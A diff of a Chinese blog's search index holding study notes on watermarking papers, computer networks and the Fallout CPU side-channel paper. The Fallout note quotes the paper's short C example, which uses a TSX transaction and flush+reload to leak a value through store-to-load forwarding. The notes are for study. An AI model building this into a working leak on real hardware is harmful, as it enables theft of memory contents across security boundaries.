-<p>我们生成一幅均值为0，方差为0.01的高斯噪声图像，记为S0。再在S0上做三个对称的翻转操作。</p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/7.png" class="">
-
-<p>四组水印模板，就需要四组定位模板。</p>
-<h3 id="总体过程"><a href="#总体过程" class="headerlink" title="总体过程"></a>总体过程</h3><img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/9.png" class="">
-
-<p>由于人眼对蓝色和红色的敏感度低于绿色，所以嵌入到红色通道和蓝色通道中。</p>
-<h2 id="提取算法流程"><a href="#提取算法流程" class="headerlink" title="提取算法流程"></a>提取算法流程</h2><img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/10.png" class="">
-
-<p>先对图像进行透视矫正：</p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/11.png" class="">
-
-<p>再寻找红色通道的横纵对称轴来定位和恢复水印。以列为例：</p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/12.png" class="">
-
-<p>以第j列为分界线，分成了j1、j2和j3三个区域。比较j1和j2的相似度。取一个使左右相似度最高的j列来作为列对称轴。行也如此。</p>
-<h3 id="两阶段的提取网络"><a href="#两阶段的提取网络" class="headerlink" title="两阶段的提取网络"></a>两阶段的提取网络</h3><p>提取部分使用深度学习的方式，有两个阶段的提取网络，一个是辅助增强子网络用以恢复扭曲的图像，一个分类子网络对每个比特模式进行分类。</p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/13.png" class="">
-
-<p>我们希望辅助增强子网络能学习逆畸变过程。使用Unet结构</p>
-<p>关于Unet：<a href="https://blog.csdn.net/l2181265/article/details/87735610">https://blog.csdn.net/l2181265/article/details/87735610</a></p>
-<p>Unet的结构是先编码（下采用）再解码（上采样）的<strong>U形结构</strong>，保持输入和输出大小一样。</p>
-<p>关于通道数和卷积的关系：<a href="https://zhuanlan.zhihu.com/p/251068800">https://zhuanlan.zhihu.com/p/251068800</a></p>
-<p>这里先用16个卷积核将1通道图像输出成16通道。再用4个卷积层进行下采样（每次采样时通道数翻倍，长宽减半，所以存在两个卷积核），得到4*4的一个特征映射，再使用一个额外的卷积层得到一个全局的1*1的特征块，并反复连接到4*4的特征映射上得到一个128通道的4*4的特征块。再通过上采样过程，恢复成和输出一样。</p>
-<p>分类子网络是一个二分类器，判断该32*32单元是表示1还是0。</p>
-<p>损失函数：</p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/14.png" class="">
-
-<p>CE：交叉熵。<a href="https://zhuanlan.zhihu.com/p/35709485">https://zhuanlan.zhihu.com/p/35709485</a></p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/15.png" class="">
-
-
-
-]]></content>
-      <categories>
-        <category>数据驱动的数字水印</category>
-      </categories>
-  </entry>
-  <entry>
     <title>计算机网络绪论</title>
     <url>/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/</url>
     <content><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="1-1-1-概念、组成、功能和分类"><a href="#1-1-1-概念、组成、功能和分类" class="headerlink" title="1.1.1 概念、组成、功能和分类"></a>1.1.1 概念、组成、功能和分类</h3><h4 id="计算机网络的概念："><a href="#计算机网络的概念：" class="headerlink" title="计算机网络的概念："></a>计算机网络的概念：</h4><p>​    计算机网络：是一个将分散的、具有独立功能的计算机系统。通过通信设备与线路连接起来，由功能完善的软件实现资源共享和信息传递的系统。</p>
@@ -2717,99 +2633,88 @@
       </categories>
   </entry>
   <entry>
-    <title>A Novel Two-stage Separable Deep Learning Framework for 论文笔记</title>
-    <url>/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/</url>
-    <content><![CDATA[<h1 id="一种两阶段可分离深度学习框架的实用盲水印"><a href="#一种两阶段可分离深度学习框架的实用盲水印" class="headerlink" title="一种两阶段可分离深度学习框架的实用盲水印"></a>一种两阶段可分离深度学习框架的实用盲水印</h1><h2 id="传统OET深度网络体系"><a href="#传统OET深度网络体系" class="headerlink" title="传统OET深度网络体系"></a>传统OET深度网络体系</h2><img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/1.png" class="">
-
-<p>这样一个体系由三个组件构成：</p>
+    <title>Deep_Template-Based_Watermarking 论文笔记</title>
+    <url>/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/</url>
+    <content><![CDATA[<h1 id="基于深度模板的数字水印"><a href="#基于深度模板的数字水印" class="headerlink" title="基于深度模板的数字水印"></a>基于深度模板的数字水印</h1><h2 id="传统基于模板的数字水印"><a href="#传统基于模板的数字水印" class="headerlink" title="传统基于模板的数字水印"></a>传统基于模板的数字水印</h2><p>基于模板的数字水印是传统水印算法的一个重要分支，与其他类型相比，具有更高的嵌入效率。模板是专门设计出来的带有一些统计特征的模式，用来携带水印和定位水印信息的。</p>
+<p>嵌入过程是将模板叠加到图像的空间域中来执行。</p>
+<p>关于空间域：又称图像空间(image space)。由图像像元组成的空间。在图像空间中以长度(距离)为自变量直接对像元值进行处理称为空间域处理。</p>
 <ul>
-<li>编码器<ul>
-<li>对输入图像添加水印</li>
+<li>以时间作为变量所进行的研究就是时域</li>
+<li>以频率作为变量所进行的研究就是频域</li>
+<li>以空间坐标作为变量进行的研究就是空间域</li>
+<li>以波数作为变量所进行的研究称为波数域</li>
 </ul>
-</li>
-<li>噪声层<ul>
-<li>模拟水印图像遭受的噪声攻击</li>
-</ul>
-</li>
-<li>解码器<ul>
-<li>从收到噪声攻击的图像中恢复水印</li>
-</ul>
-</li>
-</ul>
-<h2 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h2><ol>
-<li>OET中，编码器和解码器必须同时与噪声层共同训练，这意味着噪声必须支持反向传播，但自然的噪声往往不具备这样的能力。</li>
-<li>每当引入一个新类型的噪声，编码器和解码器的参数必须重新调整，算力要求高。</li>
-<li>对超参数十分敏感，对于新型噪声，学习得到的超参数可能不能很好的应对。所以在损失函数的指导下，训练过程中会往降低水印质量的方向收敛。</li>
-</ol>
-<p>关于超参数:</p>
-<p>机器学习需要人工调整参数（如权重和偏移），让输出的结果尽可能靠近正确结果。而深度学习是计算机自己调整参数，直到达到一个最好的学习效果。但在学习开始之前，需要设置一些参数，来定义关于模型的复杂性或学习能力，被称为<strong>超参数</strong>。超参数是不能通过训练模型得到的。</p>
-<h2 id="TSDL（可分离式深度学习）"><a href="#TSDL（可分离式深度学习）" class="headerlink" title="TSDL（可分离式深度学习）"></a>TSDL（可分离式深度学习）</h2><p>我们提出了一种可分离式深度学习(TSDL)水印框架。存在两个工作阶段。</p>
+<p>在深度学习之前，特征提取过程主要是通过一系列图像处理操作来完成的，如边缘检测、SIFT特征提取等。但这种的特征提取能力有限，无法抵御严重的失真。因此，这些传统方法的鲁棒性都不够好。为了提高鲁棒性，唯一可能的方法是使用更强的模板模式，但这将严重牺牲视觉质量。</p>
+<h2 id="提取程序的框架"><a href="#提取程序的框架" class="headerlink" title="提取程序的框架"></a>提取程序的框架</h2><p>主要由两个模块构成：目标水印模块和辅助定位模块</p>
+<h3 id="目标水印模块"><a href="#目标水印模块" class="headerlink" title="目标水印模块"></a>目标水印模块</h3><p>对于一个给定的目标水印序列，首先通过循环冗余码CRC（<a href="https://www.jianshu.com/p/7f4fd7f62de2%EF%BC%89%E5%92%8CBCH%E7%A0%81%EF%BC%88https://zhuanlan.zhihu.com/p/95909150?utm_source=wechat_session%EF%BC%89%E5%AF%B9%E5%85%B6%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81%EF%BC%8C%E7%94%9F%E6%88%90%E5%85%B7%E6%9C%89%E7%BA%A0%E9%94%99%E8%83%BD%E5%8A%9B%E7%9A%84%E6%B6%88%E6%81%AF%E4%BD%8D%E7%9F%A9%E9%98%B5%E3%80%82">https://www.jianshu.com/p/7f4fd7f62de2）和BCH码（https://zhuanlan.zhihu.com/p/95909150?utm_source=wechat_session）对其进行编码，生成具有纠错能力的消息位矩阵。</a></p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/1.png" class="">
+
+<p>在基于模板的水印算法中，位‘0/1’用不同的图案表示。最终的水印模板是根据矩阵W放置相应的‘0/1’图案组成的。</p>
+<p>我们提出了一套基于人类视觉系统特性的模板生成准则（HVS）</p>
 <ol>
-<li>第一阶段，采用多层特征编码策略，在不参考任何噪声的情况下冗余地将水印消息自动编码到图像中，我们称之为无噪声端到端对手训练（FEAT）</li>
-<li>第二阶段，名为噪声感知解码器（ADOT）训练。不断修改解码器的参数，使其能在噪声攻击下准确提取水印。</li>
+<li><p>由于“<strong>倾斜效应</strong>”，相同的修改像素量下，倾斜方向的图像比水平方向和垂直方向的图像产生的变化感知更小。</p>
+</li>
+<li><p><strong>JPEG压缩</strong>对<strong>高频</strong>分量的影响较大，对低频影响较小，所以模板需要将信息更多的集中在低频，抵抗JPEG压缩的影响</p>
+</li>
+<li><p>由于传输过程中的<strong>采样操作</strong>，改变了模板的<strong>连通域</strong>。为了保证特征的完整性，至少要在模板中存在一个较大的连通域，这样采样操作才不会擦除所有的特征。</p>
+<p>图像的连通域：是指图像中具有相同或相似像素值并且位置相邻的像素组成的区域。</p>
+<img src="/2.png" style="zoom:50%;" /></li>
+<li><p>人眼对亮度梯度的变化十分敏感。所以我们的模板应该避免显著的亮度变化。</p>
+</li>
 </ol>
-<p>与OET相比，我们的编码器能获得更好的编码图像质量。由于第一阶段并没有引入噪声层，所以我们的编码器必须做到在看不到任何噪声的情况下学会对抗噪声。</p>
-<p>为了实现这一目标，我们提出了一种冗余的多层次特征编码网络（RMFEN）。我们还设置了一个强度因子，灵活地在鲁棒性和不可感知性之间权衡。</p>
-<h2 id="模型架构"><a href="#模型架构" class="headerlink" title="模型架构"></a>模型架构</h2><img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/2.png" class="">
+<p>我们设计了32*32的模板</p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/5.png" class="">
 
-<ol>
-<li>将原图像Ico和信息M（-1和1的序列）输入到<strong>编码器</strong>中，输出水印图像Ien</li>
-<li>对Ien进行<strong>噪声攻击</strong>，输出遭受攻击后的图像Ino</li>
-<li>用<strong>解码器</strong>恢复Ien或Ino中的水印信息M’</li>
-<li><strong>对手A</strong>比较Ico和Ien，评估所给图像是编码图像的概率</li>
-</ol>
-<h3 id="编码器E"><a href="#编码器E" class="headerlink" title="编码器E"></a>编码器E</h3><p>消息M是一个一维向量，我们将其复制扩展为三维张量{−1, 1}^(L∗H∗W)。</p>
-<p>L是消息长度，H、W是图像长宽。</p>
-<p>关于张量：</p>
-<p><a href="https://www.jianshu.com/p/f34457c222c5">https://www.jianshu.com/p/f34457c222c5</a></p>
-<p>先将彩色RGB图像转化为YUV图像（其实指的是 YCbCr），转化过程如下：</p>
-<p><strong>Y= 0.299*R+0.587*G+0.114*B</strong><br><strong>U=-0.147*R-0.289*G+0.463*B</strong><br><strong>V= 0.615*R-0.515*G-0.100*B</strong></p>
-<p>编码器使用64个1∗1卷积核放大覆盖图像的颜色通道（由3维放大为64维）。然后使用3∗3核大小的5个卷积层进行特征提取和水印嵌入。在嵌入水印的过程中，我们将重复的水印串接到每个卷积层的输入，引入冗余。</p>
-<p>注：1x1卷积一般只改变输出通道数（channels），<strong>而不改变输出的宽度和高度</strong></p>
-<p>将上述三维张量连接到每一层的输出特征上R^(64*H*W)，然后新的张量R^（（64+L）*H*W）被输入到下一层。最后，我们使用1∗1卷积层将多通道图片转换为3通道图片。</p>
-<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/3.png" class="">
+<p>用下面两种形式来表示0和1</p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/3.png" class="">
 
-<p>用M生成Im的水印掩码。Ien=Ico+S*Im。其中S是强度因子。</p>
-<p>损失函数（目标找到参数θE使得Ico和Ien差距最小）：</p>
-<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/4.png" class="">
+<p>倾斜的区域设计满足要求1。</p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/4.png" class="">
 
-<p>MSE：均方误差。</p>
-<h3 id="解码器D"><a href="#解码器D" class="headerlink" title="解码器D"></a>解码器D</h3><p>对于水印图片，解码器输出的M’的分布应该更接近（1，-1）。而对于没有水印的图片，输出的分布更接近0。所以我们用（-1，1）代替（0，1）。</p>
-<p>对比：</p>
-<ul>
-<li>M为0，0，1，1，M’为0，0，0，0。那么有均方误差为2</li>
-<li>M为-1，-1，1，1，M’为0，0，0，0。那么均方误差为4</li>
-</ul>
-<p>这样损失函数更能比较解码器的性能：</p>
-<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/5.png" class="">
+<p>傅里叶变换后，发现能量明显集中在低频区域满足要求2。</p>
+<p>中间有较大的联通区域，满足要求3。</p>
+<p>以灰色亮度为低，相邻模板区域之间都是以灰色相连，无论是灰色-&gt;白色，还是灰色-&gt;黑色，变化都比较顺滑，满足要求4。</p>
+<h3 id="定位模块生成"><a href="#定位模块生成" class="headerlink" title="定位模块生成"></a>定位模块生成</h3><p>于水印单元的位置和大小会受到裁剪和缩放畸变的影响，因此在提取过程中需要对水印模板进行定位和调整大小，这些都需要定位模块的参与。当定位模板与完整的水印单元成固定比例时，我们可以根据定位模板检测到的变换来恢复水印模板的原始状态。</p>
+<p>我们在图像中反复嵌入4组完整的水印，以抵抗剪切攻击（在图像受到裁剪操作时希望总有一个幸存下来）。并设置定位模板的大小为水印模板大小的1/4（图像的1/16）。</p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/6.png" class="">
 
-<h3 id="对手A"><a href="#对手A" class="headerlink" title="对手A"></a>对手A</h3><p>在对手网络对抗中，编码器不断更新θE，来试图欺骗对手，使得对手无法判断Ico和Ien。对于A，则不断更新θA来对Ico和Ien进行二分类。</p>
-<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/6.png" class="">
+<p>我们生成一幅均值为0，方差为0.01的高斯噪声图像，记为S0。再在S0上做三个对称的翻转操作。</p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/7.png" class="">
 
-<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/7.png" class="">
+<p>四组水印模板，就需要四组定位模板。</p>
+<h3 id="总体过程"><a href="#总体过程" class="headerlink" title="总体过程"></a>总体过程</h3><img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/9.png" class="">
 
-<h2 id="两阶段可分离式训练"><a href="#两阶段可分离式训练" class="headerlink" title="两阶段可分离式训练"></a>两阶段可分离式训练</h2><p>阶段一：无噪声端到端对手训练（FEAT），目的是最小化：</p>
-<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/8.png" class="">
+<p>由于人眼对蓝色和红色的敏感度低于绿色，所以嵌入到红色通道和蓝色通道中。</p>
+<h2 id="提取算法流程"><a href="#提取算法流程" class="headerlink" title="提取算法流程"></a>提取算法流程</h2><img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/10.png" class="">
 
-<p>阶段二：噪声感知解码器（ADOT）训练。目标是最小化：</p>
-<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/5.png" class="">
+<p>先对图像进行透视矫正：</p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/11.png" class="">
 
-<p>第一阶段的训练对第二阶段的训练能起到加速作用。</p>
-<h3 id="传统噪声攻击"><a href="#传统噪声攻击" class="headerlink" title="传统噪声攻击"></a>传统噪声攻击</h3><ol>
-<li>Resize噪声，将图片缩小为原先的p倍再放大回原先尺寸</li>
-<li>椒盐噪声(salt-and-pepper noise)是指两种噪声，一种是盐噪声（salt noise），另一种是胡椒噪声（pepper  noise）。盐=白色(0)，椒=黑色(255)。前者是高灰度噪声，后者属于低灰度噪声。一般两种噪声同时出现，呈现在图像上就是黑白杂点。</li>
-<li>高斯噪声，指噪声的概率密度函数服从高斯分布</li>
-<li>JPEG压缩</li>
-</ol>
-<h3 id="黑盒噪声攻击"><a href="#黑盒噪声攻击" class="headerlink" title="黑盒噪声攻击"></a>黑盒噪声攻击</h3><p>日常生活中常见的图像处理软件引起的噪声攻击，我们称之为黑盒噪声。这种图像处理算法封装在软件中，总是集成了各种改变整个图像像素的传统噪声，</p>
-<h3 id="指定训练和组合训练"><a href="#指定训练和组合训练" class="headerlink" title="指定训练和组合训练"></a>指定训练和组合训练</h3><p>指定训练：在单个噪声下进行ADOT训练</p>
-<p>组合训练：在各种噪声下进行ADOT训练</p>
-<h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/9.png" class="">
+<p>再寻找红色通道的横纵对称轴来定位和恢复水印。以列为例：</p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/12.png" class="">
 
-<p>Pretrained 表示第一阶段无噪声下，解码器的准确率</p>
-<p>Specified 表示指定噪声训练下，指定解码器的准确率</p>
-<p>Combined 表示在该噪声下，组合解码器的准确率</p>
+<p>以第j列为分界线，分成了j1、j2和j3三个区域。比较j1和j2的相似度。取一个使左右相似度最高的j列来作为列对称轴。行也如此。</p>
+<h3 id="两阶段的提取网络"><a href="#两阶段的提取网络" class="headerlink" title="两阶段的提取网络"></a>两阶段的提取网络</h3><p>提取部分使用深度学习的方式，有两个阶段的提取网络，一个是辅助增强子网络用以恢复扭曲的图像，一个分类子网络对每个比特模式进行分类。</p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/13.png" class="">
+
+<p>我们希望辅助增强子网络能学习逆畸变过程。使用Unet结构</p>
+<p>关于Unet：<a href="https://blog.csdn.net/l2181265/article/details/87735610">https://blog.csdn.net/l2181265/article/details/87735610</a></p>
+<p>Unet的结构是先编码（下采用）再解码（上采样）的<strong>U形结构</strong>，保持输入和输出大小一样。</p>
+<p>关于通道数和卷积的关系：<a href="https://zhuanlan.zhihu.com/p/251068800">https://zhuanlan.zhihu.com/p/251068800</a></p>
+<p>这里先用16个卷积核将1通道图像输出成16通道。再用4个卷积层进行下采样（每次采样时通道数翻倍，长宽减半，所以存在两个卷积核），得到4*4的一个特征映射，再使用一个额外的卷积层得到一个全局的1*1的特征块，并反复连接到4*4的特征映射上得到一个128通道的4*4的特征块。再通过上采样过程，恢复成和输出一样。</p>
+<p>分类子网络是一个二分类器，判断该32*32单元是表示1还是0。</p>
+<p>损失函数：</p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/14.png" class="">
+
+<p>CE：交叉熵。<a href="https://zhuanlan.zhihu.com/p/35709485">https://zhuanlan.zhihu.com/p/35709485</a></p>
+<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/15.png" class="">
+
+
+
 ]]></content>
+      <categories>
+        <category>数据驱动的数字水印</category>
+      </categories>
   </entry>
   <entry>
     <title>Fallout: Leaking Data on Meltdown-resistant CPUs 论文笔记</title>
@@ -2842,7 +2747,7 @@
 <p>​        当程序试图从一个地址读取数据时，CPU必须首先检查存储缓冲区是否写入了相同的地址，如果地址匹配，则执行store-to-load forwarding。但是如果地址匹配但地址无效，则会产生WTF漏洞。</p>
 <p>​        Inter的专利中表明，上述操作确实会发生错误。</p>
 <p>“if there is a hit at operation 302 [lower address match]and the physical address of the load or store operations is not valid, the physical address check at operation 310 [full physical address match] may be considered as a hit and the method 300 [store-to-load forwarding] may continue at operation 308 [block load/forward data from store].”</p>
-<p>​        如果构造了一个地址，通过了302操作（低地址匹配）但地址无效，就会触发检测方法310（全物理地址匹配），导致错误。（300操作（store-to-load forwarding）和308操作（block load/forward data from store））</p>
+<p>​        如果一个无效的地址，通过了低地址匹配302，但无法通过全地址匹配310，就会引发错误。该错误会导致300操作，使得store-to-load forwarding。</p>
 <h2 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="keyword">char</span>* victim_page = mmap(...,PAGE_SIZE,PROT_READ|PROT_WRITE,MAP_POPULATE, ...);</span><br><span class="line"><span class="number">2</span><span class="keyword">char</span>* attacker_address = <span class="number">0x9876543214321000</span>ull;<span class="comment">//unsigned long long</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span><span class="keyword">int</span> offset = <span class="number">7</span>;</span><br><span class="line"><span class="number">5</span>victim_page[offset] = <span class="number">42</span>;</span><br><span class="line"><span class="number">6</span><span class="keyword">if</span>(tsx_begin() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">7</span>memory_access(lut + <span class="number">4096</span> * attacker_address[offset]);</span><br><span class="line"><span class="number">8</span>tsx_end();</span><br><span class="line"><span class="number">9</span>&#125;</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11f</span><span class="keyword">or</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line"><span class="number">12</span>	<span class="keyword">if</span>(flush_reload(lut + i * <span class="number">4096</span>)) &#123;</span><br><span class="line"><span class="number">13</span>	report(i);</span><br><span class="line"><span class="number">14</span>	&#125;</span><br><span class="line"><span class="number">15</span>&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​        上述的victim_page是一个普通的页面，用户可以在其中读写数据。attacker_address是构造的一个非规范的地址，其中的47到63位既不全是’ 0 ‘也不全是’ 1 ‘来导致错误。（行1-2）</p>
@@ -3742,5 +3647,100 @@ end:    for(i=0;i&lt;n;i++)
       <categories>
         <category>操作系统</category>
       </categories>
+  </entry>
+  <entry>
+    <title>A Novel Two-stage Separable Deep Learning Framework for 论文笔记</title>
+    <url>/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/</url>
+    <content><![CDATA[<h1 id="一种两阶段可分离深度学习框架的实用盲水印"><a href="#一种两阶段可分离深度学习框架的实用盲水印" class="headerlink" title="一种两阶段可分离深度学习框架的实用盲水印"></a>一种两阶段可分离深度学习框架的实用盲水印</h1><h2 id="传统OET深度网络体系"><a href="#传统OET深度网络体系" class="headerlink" title="传统OET深度网络体系"></a>传统OET深度网络体系</h2><img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/1.png" class="">
+
+<p>这样一个体系由三个组件构成：</p>
+<ul>
+<li>编码器<ul>
+<li>对输入图像添加水印</li>
+</ul>
+</li>
+<li>噪声层<ul>
+<li>模拟水印图像遭受的噪声攻击</li>
+</ul>
+</li>
+<li>解码器<ul>
+<li>从收到噪声攻击的图像中恢复水印</li>
+</ul>
+</li>
+</ul>
+<h2 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h2><ol>
+<li>OET中，编码器和解码器必须同时与噪声层共同训练，这意味着噪声必须支持反向传播，但自然的噪声往往不具备这样的能力。</li>
+<li>每当引入一个新类型的噪声，编码器和解码器的参数必须重新调整，算力要求高。</li>
+<li>对超参数十分敏感，对于新型噪声，学习得到的超参数可能不能很好的应对。所以在损失函数的指导下，训练过程中会往降低水印质量的方向收敛。</li>
+</ol>
+<p>关于超参数:</p>
+<p>机器学习需要人工调整参数（如权重和偏移），让输出的结果尽可能靠近正确结果。而深度学习是计算机自己调整参数，直到达到一个最好的学习效果。但在学习开始之前，需要设置一些参数，来定义关于模型的复杂性或学习能力，被称为<strong>超参数</strong>。超参数是不能通过训练模型得到的。</p>
+<h2 id="TSDL（可分离式深度学习）"><a href="#TSDL（可分离式深度学习）" class="headerlink" title="TSDL（可分离式深度学习）"></a>TSDL（可分离式深度学习）</h2><p>我们提出了一种可分离式深度学习(TSDL)水印框架。存在两个工作阶段。</p>
+<ol>
+<li>第一阶段，采用多层特征编码策略，在不参考任何噪声的情况下冗余地将水印消息自动编码到图像中，我们称之为无噪声端到端对手训练（FEAT）</li>
+<li>第二阶段，名为噪声感知解码器（ADOT）训练。不断修改解码器的参数，使其能在噪声攻击下准确提取水印。</li>
+</ol>
+<p>与OET相比，我们的编码器能获得更好的编码图像质量。由于第一阶段并没有引入噪声层，所以我们的编码器必须做到在看不到任何噪声的情况下学会对抗噪声。</p>
+<p>为了实现这一目标，我们提出了一种冗余的多层次特征编码网络（RMFEN）。我们还设置了一个强度因子，灵活地在鲁棒性和不可感知性之间权衡。</p>
+<h2 id="模型架构"><a href="#模型架构" class="headerlink" title="模型架构"></a>模型架构</h2><img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/2.png" class="">
+
+<ol>
+<li>将原图像Ico和信息M（-1和1的序列）输入到<strong>编码器</strong>中，输出水印图像Ien</li>
+<li>对Ien进行<strong>噪声攻击</strong>，输出遭受攻击后的图像Ino</li>
+<li>用<strong>解码器</strong>恢复Ien或Ino中的水印信息M’</li>
+<li><strong>对手A</strong>比较Ico和Ien，评估所给图像是编码图像的概率</li>
+</ol>
+<h3 id="编码器E"><a href="#编码器E" class="headerlink" title="编码器E"></a>编码器E</h3><p>消息M是一个一维向量，我们将其复制扩展为三维张量{−1, 1}^(L∗H∗W)。</p>
+<p>L是消息长度，H、W是图像长宽。</p>
+<p>关于张量：</p>
+<p><a href="https://www.jianshu.com/p/f34457c222c5">https://www.jianshu.com/p/f34457c222c5</a></p>
+<p>先将彩色RGB图像转化为YUV图像（其实指的是 YCbCr），转化过程如下：</p>
+<p><strong>Y= 0.299*R+0.587*G+0.114*B</strong><br><strong>U=-0.147*R-0.289*G+0.463*B</strong><br><strong>V= 0.615*R-0.515*G-0.100*B</strong></p>
+<p>编码器使用64个1∗1卷积核放大覆盖图像的颜色通道（由3维放大为64维）。然后使用3∗3核大小的5个卷积层进行特征提取和水印嵌入。在嵌入水印的过程中，我们将重复的水印串接到每个卷积层的输入，引入冗余。</p>
+<p>注：1x1卷积一般只改变输出通道数（channels），<strong>而不改变输出的宽度和高度</strong></p>
+<p>将上述三维张量连接到每一层的输出特征上R^(64*H*W)，然后新的张量R^（（64+L）*H*W）被输入到下一层。最后，我们使用1∗1卷积层将多通道图片转换为3通道图片。</p>
+<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/3.png" class="">
+
+<p>用M生成Im的水印掩码。Ien=Ico+S*Im。其中S是强度因子。</p>
+<p>损失函数（目标找到参数θE使得Ico和Ien差距最小）：</p>
+<img src="/2021/12/23/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AA-Novel-Two-stage-Separable-Deep-Learning-Framework-for/4.png" class="">
+
+<p>MSE：均方误差。</p>
